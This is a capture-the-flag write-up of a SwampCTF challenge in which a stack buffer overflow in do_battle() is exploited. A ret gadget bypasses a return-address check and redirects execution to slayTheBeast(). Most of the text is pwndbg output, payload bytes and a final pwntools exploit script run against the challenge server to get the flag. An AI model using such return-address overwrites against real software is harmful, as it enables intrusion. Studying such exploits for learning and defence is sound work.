### Solved by superkojiman

There are two functions of interest; `do_battle()` which is called from main, and `slayTheBeast()` which isn't called from anywhere. If we look at the disassembly for `slayTheBeast()` we see that it prints out the contents of the flag. Somehow we need to redirect execution to this function. 

Let's take a look at `do_battle()`

![](/images/2018/swampctf/return/01.png)

Here it reads up to 50 bytes of data into a buffer in the stack. A quick look at gdb shows that we can overwrite the saved return pointer if after 42 bytes:

```
────────────────────────────────────────[ DISASM ]──────────────────────────────────────────
 ► 0x804852d <doBattle+50>    call   read@plt <0x8048390>
        fd: 0x0
        buf: 0xffbdb6c2 ◂— 0x50000000
        nbytes: 0x32

   0x8048532 <doBattle+55>    add    esp, 0x10
   0x8048535 <doBattle+58>    lea    eax, dword ptr [ebp - 0x26]
   0x8048538 <doBattle+61>    add    eax, 0x2a
   0x804853b <doBattle+64>    mov    eax, dword ptr [eax]
   0x804853d <doBattle+66>    mov    edx, eax
   0x804853f <doBattle+68>    mov    eax, doBattle+154 <0x8048595>
   0x8048544 <doBattle+73>    cmp    edx, eax
   0x8048546 <doBattle+75>    jbe    doBattle+120 <0x8048573>

   0x8048548 <doBattle+77>    sub    esp, 0xc
   0x804854b <doBattle+80>    push   0x804874c
──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ esp    0xffbdb6b0 ◂— 0x0
01:0004│        0xffbdb6b4 —▸ 0xffbdb6c2 ◂— 0x50000000
02:0008│        0xffbdb6b8 ◂— 0x32 /* '2' */
03:000c│        0xffbdb6bc —▸ 0xf77261b0 —▸ 0xf7563000 ◂— jg     0xf7563047
04:0010│ eax-2  0xffbdb6c0 ◂— 0x8000
05:0014│        0xffbdb6c4 —▸ 0xf7715000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
06:0018│        0xffbdb6c8 —▸ 0xf7713244 —▸ 0xf757b020 (_IO_check_libio) ◂— call   0xf7682b59
07:001c│        0xffbdb6cc —▸ 0xf757b0ec (init_cacheinfo+92) ◂— test   eax, eax
────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► f 0  804852d doBattle+50
   f 1  80485ad main+22
   f 2 f757b637 __libc_start_main+247
Breakpoint *0x804852d
pwndbg> retaddr
0xffbdb6ec —▸ 0x80485ad (main+22) ◂— sub    esp, 0xc
0xffbdb77c —▸ 0x8048421 (_start+33) ◂— hlt
pwndbg> p/d 0xffbdb6ec - 0xffbdb6c2
$1 = 42
pwndbg> p/d 0x32
$2 = 50
pwndbg>
```

So ideally we'd want to overwrite the saved return pointer with the address of `slayTheBeast()` and be done with it, but that actually won't work. 

At 0x8048544, it checks if the saved return pointer is less than or equal to 0x8048573. If it isn't, then we lose and `exit()` is called, which prevents us from returning to an address of our choosing on the stack. `slayTheBeast()` is at 0x80485db which is greater than 0x8048573, so that won't work.

So let's overwrite it with whatever value will pass at the moment: 

```
buf = ""
buf += "A"*42
buf += p32(0x8048595)
buf += "B"*(50 - len(buf))
```

Write that into a file, direct it into gdb, and break at the function epilogue in `do_battle()`: 

```
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
*ECX  0xf7749870 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
*EDI  0xf7748000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
*ESI  0xf7748000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
*EBP  0xffc9f2b8 ◂— 0x41414141 ('AAAA')
*ESP  0xffc9f290 ◂— 0x41418000
*EIP  0x8048595 (doBattle+154) ◂— leave
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
 ► 0x8048595 <doBattle+154>    leave
   0x8048596 <doBattle+155>    ret

   0x8048597 <main>            lea    ecx, dword ptr [esp + 4]
   0x804859b <main+4>          and    esp, 0xfffffff0
   0x804859e <main+7>          push   dword ptr [ecx - 4]
   0x80485a1 <main+10>         push   ebp
   0x80485a2 <main+11>         mov    ebp, esp
   0x80485a4 <main+13>         push   ecx
   0x80485a5 <main+14>         sub    esp, 4
   0x80485a8 <main+17>         call   doBattle <0x80484fb>

   0x80485ad <main+22>         sub    esp, 0xc
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffc9f290 ◂— 0x41418000
01:0004│      0xffc9f294 ◂— 0x41414141 ('AAAA')
... ↓
```

Let's execute `leave` and see what happens:

```
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xf7749870 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
 EDI  0xf7748000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7748000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
*EBP  0x41414141 ('AAAA')
*ESP  0xffc9f2bc —▸ 0x8048595 (doBattle+154) ◂— leave
*EIP  0x8048596 (doBattle+155) ◂— ret
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
   0x8048595 <doBattle+154>    leave
 ► 0x8048596 <doBattle+155>    ret             <0x8048595; doBattle+154>
    ↓
   0x8048595 <doBattle+154>    leave
 ► 0x804859e <doBattle+155>    ret             <0x8048595; doBattle+154>
    ↓
   0x8048595 <doBattle+154>    leave
 ► 0x8048596 <doBattle+155>    ret             <0x8048595; doBattle+154>
    ↓
   0x8048595 <doBattle+154>    leave
 ► 0x8048596 <doBattle+155>    ret             <0x8048595; doBattle+154>
    ↓
   0x8048595 <doBattle+154>    leave
 ► 0x8048596 <doBattle+155>    ret             <0x8048595; doBattle+154>
    ↓
   0x8048595 <doBattle+154>    leave
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffc9f2bc —▸ 0x8048595 (doBattle+154) ◂— leave
01:0004│      0xffc9f2c0 ◂— 0x42424242 ('BBBB')
02:0008│      0xffc9f2c4 —▸ 0xffc9f2e0 ◂— 0x1
03:000c│      0xffc9f2c8 ◂— 0x0
04:0010│      0xffc9f2cc —▸ 0xf75ae637 (__libc_start_main+247) ◂— add    esp, 0x10
05:0014│      0xffc9f2d0 —▸ 0xf7748000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
... ↓
07:001c│      0xffc9f2d8 ◂— 0x0
```

`ret` will return to 0x8048595 which is the call to `leave` in this function. Notice that on the stack we have part of our payload "BBBB". If we could replace that with the address of `slayTheBeast()` and return to it, then we'd win.

Doing that is pretty easy, we just need to find another `ret` instruction so that we return to that, and that in turn, will return to the address of `slayTheBeast()`. However, the address of said instruction must be less than 0x8048595 in order to pass the check.

A gadget that meets those requirements can be found in `__do_global_dtors_aux()`

![](/images/2018/swampctf/return/02.png)

Here's how our exploit looks now:

```
buf = ""
buf += "A"*42
buf += p32(0x80484cc)       # ret @ __do_global_dtors_aux
buf += p32(0x80485db)       # slayTheBeast()
buf += "B"*(50 - len(buf))
```

If we break at the call to `ret` we can see that it'll jump to `__do_global_dtors_aux`, execute `ret` from there, and return to `slayTheBeast()`:

```
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xf7780870 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
 EDI  0xf777f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf777f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
*EBP  0x41414141 ('AAAA')
*ESP  0xff86192c —▸ 0x80484cc (__do_global_dtors_aux+28) ◂— ret
*EIP  0x8048596 (doBattle+155) ◂— ret
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
   0x8048595 <doBattle+154>                leave
 ► 0x8048596 <doBattle+155>                ret             <0x80484cc; __do_global_dtors_aux+28>
    ↓
   0x8048595 <doBattle+154>                leave
 ► 0x8048596 <doBattle+155>                ret             <0x80484cc; __do_global_dtors_aux+28>
    ↓
   0x8048595 <doBattle+154>                leave
 ► 0x8048596 <doBattle+155>                ret             <0x80484cc; __do_global_dtors_aux+28>
    ↓
   0x80484cc <__do_global_dtors_aux+28>    ret
    ↓
   0x80485db <slayTheBeast>                push   ebp
   0x80485dc <slayTheBeast+1>              mov    ebp, esp
   0x80485de <slayTheBeast+3>              sub    esp, 8
   0x80485e1 <slayTheBeast+6>              sub    esp, 0xc
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xff86192c —▸ 0x80484cc (__do_global_dtors_aux+28) ◂— ret
01:0004│      0xff861930 —▸ 0x80485db (slayTheBeast) ◂— push   ebp
02:0008│      0xff861934 —▸ 0xff861950 ◂— 0x1
03:000c│      0xff861938 ◂— 0x0
04:0010│      0xff86193c —▸ 0xf75e5637 (__libc_start_main+247) ◂— add    esp, 0x10
05:0014│      0xff861940 —▸ 0xf777f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
... ↓
07:001c│      0xff861948 ◂— 0x0
```

Here's the final working exploit: 

```
#!/usr/bin/env python

from pwn import *

r = remote("chal1.swampctf.com", 1802)

ret_addr    = p32(0x80484cc)    # ret @ __do_global_dtors_aux
win         = p32(0x80485db)    # slayTheBeast()

buf = ""
buf += "A"*42
buf += ret_addr
buf += win

print r.recv()
r.send(buf)
print r.recvall()
```

Running it gets us the flag:

```
# ./sploit.py
[+] Opening connection to chal1.swampctf.com on port 1802: Done
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do:

[+] Receiving all data: Done (434B)
[*] Closed connection to chal1.swampctf.com port 1802
Your actions take the Allip by surprise, causing it to falter in its attack!  You notice a weakness in the beasts form and see a glimmer of how it might be defeated.
Through expert manouvering of both body and mind, you lash out with your ethereal blade and pierce the beast's heart, slaying it.
As it shimmers and withers, you quickly remember to lean in and command it to relinquish its secret:
flag{f34r_n0t_th3_4nc13n7_R0pn1qu3}
```
